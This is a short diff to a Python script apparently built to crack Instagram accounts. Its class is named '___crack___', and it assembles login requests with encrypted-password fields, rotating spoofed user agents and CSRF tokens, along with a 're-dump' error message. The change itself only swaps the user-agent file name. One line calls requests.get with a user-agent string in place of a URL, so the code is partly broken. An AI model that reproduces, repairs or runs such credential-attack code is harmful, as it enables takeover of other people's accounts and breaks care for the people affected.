@@ -412,7 +412,7 @@ class ___crack___:
             exit(f"{P}[{M}!{P}]{M} Crack is complete, there seems to be an error, please re-dump!")
     def __main__(self, user, uid, pwx):
         try:
-            ___useragent = open('Data/ua2.txt', 'r').read()
+            ___useragent = open('Data/ua.txt', 'r').read()
         except (IOError):
             ___useragent = ('Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)')  
             ___roz = requests.get('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36')
@@ -427,7 +427,7 @@ class ___crack___:
                 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pw}',
                 'queryParams': {},
                 'optIntoOneTap': 'false'}
-                ___head = {'User-Agent': random.choice(open("Data/ua2.txt","r").read().splitlines()),
+                ___head = {'User-Agent': random.choice(open("Data/ua.txt","r").read().splitlines()),
                 'X-Requested-With': 'XMLHttpRequest',
                 'Referer': 'https://www.instagram.com/accounts/login/',
                 'x-csrftoken': ___csrf}
